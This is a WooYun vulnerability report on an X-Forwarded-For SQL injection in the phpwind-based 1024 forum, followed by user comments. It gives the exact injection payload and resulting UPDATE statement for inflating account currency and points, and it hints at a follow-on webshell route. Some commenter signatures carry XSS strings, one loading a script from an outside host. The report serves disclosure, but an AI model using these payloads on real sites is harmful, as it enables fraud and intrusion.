{"id": 81849, "wybug_id": "wooyun-2015-0152694", "wybug_title": "一个可以让你成为1024社区最富有の人的SQL注入漏洞", "wybug_corp": "1024社区", "wybug_author": "猪猪侠", "wybug_date": "2015-11-07 23:26", "wybug_open_date": "2015-12-22 23:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-07：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-12-22：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： CloudFlare的WAF也阻拦不了你成为1024社区最富有の人 详细说明：  #0 先看shell证明，提起兴趣，再看内容\n\n#1 注入描述当我们在登陆1024论坛的时候，程序会更新记录我们每次登陆的IP信息，最后登录的时间，具体SQL如下\nUPDATE LOW_PRIORITY pw_memberdata SET lastvisit='1446906480',thisvisit='1446906480',onlineip='8.8.8.8|1446906480|6' WHERE uid='387090'\n#2 phpwind处理登陆IP的代码如下，先从客户端拿X-Forwarded-For的值\n\n#3 漏洞利用控制X-Forwarded-For为SQL注入代码就可以利用了这里1024社区的代码，仅仅限制客户端IP的长度为15，多了抛弃，当不妨碍我们成为最富有の人\n\n   漏洞证明：  #4 phpwind数据库结构，money = USD，rvrc = 威望，credit = 贡献值\nCREATE TABLE pw_memberdata (  uid MEDIUMINT(8) UNSIGNED NOT NULL DEFAULT '0',  postnum INT(10) UNSIGNED NOT NULL DEFAULT '0',  digests SMALLINT(6) NOT NULL DEFAULT '0',  rvrc INT(10) NOT NULL DEFAULT '0',  money INT(10) NOT NULL DEFAULT '0',  credit INT(10) NOT NULL DEFAULT '0',  currency INT(10) NOT NULL DEFAULT '0',  editor TINYINT(1) NOT NULL DEFAULT '0',  lastvisit INT(10) UNSIGNED NOT NULL DEFAULT '0',  thisvisit INT(10) UNSIGNED NOT NULL DEFAULT '0',  lastpost INT(10) UNSIGNED NOT NULL DEFAULT '0',  onlinetime INT(10) UNSIGNED NOT NULL DEFAULT '0',  monoltime INT(10) UNSIGNED NOT NULL DEFAULT '0',  todaypost SMALLINT(6) UNSIGNED NOT NULL DEFAULT '0',  monthpost SMALLINT(6) UNSIGNED NOT NULL DEFAULT '0',  uploadtime INT(10) UNSIGNED NOT NULL DEFAULT '0',  uploadnum SMALLINT(6) UNSIGNED NOT NULL DEFAULT '0',  onlineip CHAR(30) NOT NULL DEFAULT '',  starttime INT(10) UNSIGNED NOT NULL DEFAULT '0',  postcheck CHAR(16) NOT NULL DEFAULT '',  PRIMARY KEY uid (uid),  KEY postnum (postnum)) TYPE=MYISAM;\n#5 突破限制，给你自己价钱\nUPDATE LOW_PRIORITY pw_memberdata SET lastvisit='1446906480',thisvisit='1446906480',onlineip='{你的15个字符}|1446906480|6' WHERE uid='387090'\nmysql在字段类型不匹配预先设定时，会采用强制类型转换，这里的15个字符刚好满足增加财富的需求PS：这里可以使用指数 1e9xxxxx = 1000000000，1的后面9个0\n',money='9999999\n拼凑出的完整SQL如下\nUPDATE LOW_PRIORITY pw_memberdata SET lastvisit='1446906480',thisvisit='1446906480',onlineip='',money='9999999|1446906480|6' WHERE uid='387090'\nData truncated for column 'money'，会将9999999|1446906480|6强制类型转换为999999#6 实战利用\n\n#7 设置好后，登陆你的账号，你就有999999的USD财富了，贡献值和威望依葫芦画瓢即可\n\n\n\n#8 GETSHELL后续还会发一个phpwind5前台getshell漏洞，基于上面的某些条件，就能搞到1024社区的webshell了 WooYun: Phpwind的v4/5/6/7/8命令执行漏洞 把自己的威望刷到TOP20，shell就自动躺在/data/bbs_cache里面了\n\n   修复方案：  # 更新一下版本，把onlineip过滤\n\n   版权声明：转载请注明来源 猪猪侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：16 (WooYun评价)  ", "replys": "漏洞评价：\n评价\n     2015-11-07 23:28 |    \t\tgone \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 来学习的)\t\t \n  1111    \n     2015-11-07 23:28 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:1662 漏洞数:248        | WooYun is the Bigest gay place.  网络工...)\t\t \n  哈哈，猪哥快！！！给我加点！    \n     2015-11-07 23:29 |    \t\t不会游泳的鱼 \t\t\t( 普通白帽子  |\t\t\t        Rank:141 漏洞数:45        | 非著名白帽子)\t\t \n  666    \n     2015-11-07 23:37 |    \t\tJ0kER \t\t\t( 普通白帽子  |\t\t\t        Rank:100 漏洞数:20        | )\t\t \n  求邀请码    \n     2015-11-07 23:37 |    \t\tSubmit \t\t\t( 普通白帽子  |\t\t\t        Rank:527 漏洞数:120        | )\t\t \n  怎么富RYB9    \n     2015-11-07 23:41 |    \t\tk0_pwn \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:13        | 专注且自由)\t\t \n  猪哥无人能挡了，那么问题来了，猪哥是不是要给乌云所有人发邀请码    \n     2015-11-07 23:44 |    \t\tNerd Tsai \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:9        | 还在努力学习中...Orz)\t\t \n  猪哥爆了    \n     2015-11-07 23:45 |    \t\tTren \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:61        | 求带求装B)\t\t \n  猪哥已经无人能挡了！！！！    \n     2015-11-07 23:47 |    \t\t岛云首席鉴黄师 \t\t\t( 普通白帽子  |\t\t\t        Rank:460 漏洞数:125        | icisaw.cn 超低价虚拟主机VPS 购买返现 支...)\t\t \n  猪哥的草榴帐号被搞了，一怒之下，就把草榴搞了    \n     2015-11-07 23:47 |    \t\t碎片 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:9        | <script src=http://www.xss8.net/?c=MjMf4...)\t\t \n  666666    \n     2015-11-07 23:52 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:211 漏洞数:76        | 微信公众号：233sec  不定期分享各种漏洞思...)\t\t \n  猪哥的草榴帐号被搞了，一怒之下，就把草榴搞了    \n     2015-11-07 23:55 |    \t\t小火苗 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:1        | 我是一只小火苗呀，春风吹又生呀...)\t\t \n  猪哥，给大家点福利呀，求邀请码。    \n     2015-11-07 23:59 |    \t\t动后河 \t\t\t( 实习白帽子  |\t\t\t        Rank:57 漏洞数:16        | ☭)\t\t \n  怎么个积极联系官方法？    \n     2015-11-08 00:04 |    \t\tChinalover \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:9        | 你看得到我打在屏幕上的字，却看不到我落在...)\t\t \n  可啪！    \n     2015-11-08 00:19 |    \t\tzeracker  \t\t\t( 普通白帽子  |\t\t\t        Rank:1077 漏洞数:139        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  求验证码啊。。。    \n     2015-11-08 00:44 |    \t\t金馆长 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | Up)\t\t \n  卧槽卧槽卧槽    \n     2015-11-08 00:59 |    \t\t林被甘霖老母草鸡摆 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 长得帅怪林被咯！)\t\t \n  -.-刚才测试了一下。有cloudflare防御好像。哎。不能拿邀请码了    \n     2015-11-08 03:06 |    \t\t邪少 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:12        | 百里长苏)\t\t \n  @林被甘霖老母草鸡摆  好像好没公布 您是怎么知道的 透露下    \n     2015-11-08 07:32 |    \t\tDaryl \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:5        | '\"><img/src=1 onerror=alert('干啥啥不会'...)\t\t \n  猪哥的草榴帐号被搞了，一怒之下，就把草榴搞了    \n     2015-11-08 09:23 |    \t\t小白鼠 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:2        | 小呀小呀小白鼠)\t\t \n  先关注下，据说猪猪侠csv已经在手。    \n     2015-11-08 10:40 |    \t\t大师兄 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:8        | 每日必关注乌云)\t\t \n  猪猪侠近来怒气值已满！    \n     2015-11-08 10:47 |    \t\t路人毛 \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:25        | Please speak in Chinese.)\t\t \n  今晚都是草榴人    \n     2015-11-08 11:04 |    \t\t雷少 \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:31        | 热爱网络的爱好者，需求同道中人。)\t\t \n  是时候成为真男人了    \n     2015-11-08 11:21 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  1024    \n     2015-11-08 11:37 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:103 漏洞数:27        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  绕过waf得神器哇    \n     2015-11-08 11:48 |    \t\t無名老人 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:3        | 干过开发，日过渗透，江湖人称： 少女杀手)\t\t \n  绕过waf 得神器，要涨涨姿势    \n     2015-11-08 12:56 |    \t\tMr.R \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:14        | 求大神带我飞 qq2584110147)\t\t \n  原来草榴是猪哥干的。。。。。@猪猪侠    \n     2015-11-08 14:45 |    \t\t林被甘霖老母草鸡摆 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 长得帅怪林被咯！)\t\t \n  @邪少 看微博自己测试啊    \n     2015-11-08 15:18 |    \t\tQ1NG \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:21        | 临 兵 斗 者 皆 阵 列 前 行 !)\t\t \n  就是他 大家快找他    \n     2015-11-08 19:08 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:868 漏洞数:189        )\t\t \n  留个言    \n     2015-11-08 20:35 |    \t\tSunnyDoll \t\t\t( 实习白帽子  |\t\t\t        Rank:63 漏洞数:20        | 职业搬砖工)\t\t \n  我要涨姿势    \n     2015-11-08 20:57 |    \t\tGnest \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 一地的白帽子)\t\t \n  我们调查这么久终于有线索了！    \n     2015-11-09 05:27 |    \t\tInneRs \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 初学者)\t\t \n  666666坐等草榴来认领    \n     2015-11-09 08:42 |    \t\t大师兄 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:8        | 每日必关注乌云)\t\t \n  搜了一下，原来是这种口味啊！！哈哈，谢谢！    \n     2015-11-09 08:44 |    \t\tHex \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:14        | 又一天过去了，今天过得怎么样，梦想是不是...)\t\t \n  厂商不敢认领，已主动忽略    \n     2015-11-09 09:45 |    \t\tSH0X8001 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:5        | 你猜)\t\t \n  那么多年还是没有邀请码啊    \n     2015-11-09 10:03 |    \t\tSpace \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:6        | 程序猿)\t\t \n  坐等    \n     2015-11-09 10:57 |    \t\t水泥中的鱼 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:4        | 我就是我，尘世中一迷途小书童。)\t\t \n  厂商估计不敢认领    \n     2015-11-09 11:10 |    \t\tAnnabelle \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:17        | .)\t\t \n  厂商不敢认领，已主动忽略    \n     2015-11-09 12:01 |    \t\tBlackeagle \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:10        | 向WooYun致敬)\t\t \n  我是冲着厂商来的！    \n     2015-11-09 15:21 |    \t\tCHai \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 萌新。)\t\t \n  1024是什么呀？    \n     2015-11-09 15:32 |    \t\t无心sec \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | →_→)\t\t \n  1024是什么？    \n     2015-11-09 16:06 |    \t\t暗羽 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:7        | 喵呜，给人类的智商跪了)\t\t \n  猪哥无人能挡了，那么问题来了，猪哥是不是要给乌云所有人发邀请码    \n     2015-11-09 17:05 |    \t\th3hz \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:5        )\t\t \n  猪哥的草榴帐号被搞了，一怒之下，就把草榴搞了    \n     2015-11-09 17:48 |    \t\tLet a person cry. \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:11        | xxoo)\t\t \n  不对，是猪哥在1024下不了种子了，一怒之下就干废了1024，哈哈，求邀请码。那么多年了，还是没邀请码的路过    \n     2015-11-09 18:02 |    \t\tDream、帝 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | w)\t\t \n  这是要砝码的节奏吗，每人一个    \n     2015-11-09 18:02 |    \t\t偶然 \t\t\t( 普通白帽子  |\t\t\t        Rank:282 漏洞数:72        | 我是天空里一片云。)\t\t \n  坐等厂商认领 @草榴社区    \n     2015-11-09 20:19 |    \t\txiaoxin \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:16        | 无)\t\t \n  不要漏洞，只求地址    \n     2015-11-09 21:32 |    \t\t雪葬爱 \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:8        | 小菜，大白菜，愿得一人心，白首不分离。)\t\t \n  我先修改  然后忽略    \n     2015-11-09 22:52 |    \t\t小钟 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | What the fuck.)\t\t \n  可怕    \n     2015-11-09 23:13 |    \t\tK4r1iNNg \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 叫我k4就k4吧 方便打字... ORZ)\t\t \n  感觉是个update?    \n     2015-11-10 00:08 |    \t\t指尖的温度 \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:10        )\t\t \n  来个邀请码    \n     2015-11-10 08:10 |    \t\tω电池ω \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | neusoft)\t\t \n  1024    \n     2015-11-10 09:40 |    \t\t正在行走 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 我是唐僧请来的)\t\t \n  1024    \n     2015-11-10 10:09 |    \t\t无敌L.t.H \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | ‮……肉肉捉活，亭长放解)\t\t \n  完了，以后1024要变成了一个静态站了……    \n     2015-11-10 16:27 |    \t\t老实先生 \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:22        | 关于理想我从来没选择放弃，即使在灰头土脸...)\t\t \n  @猪猪侠 求1024邀请码  谢谢    \n     2015-11-10 16:53 |    \t\t马杀鸡 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:5        | 作为一匹勇敢的马，杀鸡是必不可少的)\t\t \n  @猪猪侠，求邀请码啊求邀请码    \n     2015-11-10 17:02 |    \t\t艾弗森 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 论坛收割者)\t\t \n  授權發布By 大紅鷹本次攻擊者利用偽造IP地址包含惡意代碼注入面板數據，現已修復。網上流傳一個1024.csv，那個文件是假的；----------------在後台查看記錄時，之前那個洩露漏洞的攻擊者，嘗試備份數據庫，但是失敗了，資料估計並沒有丟失；攻擊者備份數據庫，但是數據庫太大，超時失敗了，但我們還是保守一點。請會員不必過度恐慌！當然我們首是要保護所有會員的隱私和信息。    \n     2015-11-10 17:09 |    \t\t钱塘老娘舅 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 儿女不孝老人愁，邻里矛盾起纠纷，试试找个...)\t\t \n  @艾弗森 大兄弟 社区里面混的不错啊 都代言人了    \n     2015-11-10 17:17 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3846 漏洞数:296        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  @艾弗森 大兄弟，叫大红鹰来认领漏洞啊    \n     2015-11-30 11:46 |    \t\tlostime \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:3        | CCFer, Nsclub)\t\t \n  1024这种业界良心必须得大力支持    \n     2015-11-30 17:08 |    \t\t纯情 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 站在人生的顶端，俯视生命的千姿百态。)\t\t \n  谢谢提供漏洞，邀请码没人有份。    \n     2015-11-30 22:53 |    \t\t黑名单 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:14        | 像个傻瓜似的，为什么。)\t\t \n  求邀请码 潜水多年 也没看见邀请码    \n     2015-12-03 14:31 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  @艾弗森 求个邀请码 大兄弟    \n     2016-02-27 21:38 |    \t\t艾弗森 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 论坛收割者)\t\t \n  @围剿 乌云不让留联系方式？    \n     2016-02-28 08:32 |    \t\t纯情 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 站在人生的顶端，俯视生命的千姿百态。)\t\t \n  @艾弗森 求个邀请码。私信。。    \n     2016-02-28 21:42 |    \t\tTinyMin \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 脚本非我所爱)\t\t \n  暴露了1024的网址~    \n     2016-02-28 23:01 |    \t\tLaTCue \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:28        | 满脑子的艺术细菌，当然，是人体艺术。)\t\t \n   求个邀请码 谢谢    \n     2016-02-29 17:36 |    \t\t艾弗森 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 论坛收割者)\t\t \n  @纯情 没发现私信功能~    \n     2016-02-29 17:45 |    \t\t北洋贱队 \t\t\t( 普通白帽子  |\t\t\t        Rank:252 漏洞数:25        )\t\t \n  联通4G  已经可以不翻墙直接访问t66y.com了    \n     2016-02-29 23:23 |    \t\t纯情 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 站在人生的顶端，俯视生命的千姿百态。)\t\t \n  @艾弗森 右上角\"短消息\"，然后\"写消息\"，\"用户\"填纯情。谢谢。。。    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 16, "Ranks": null}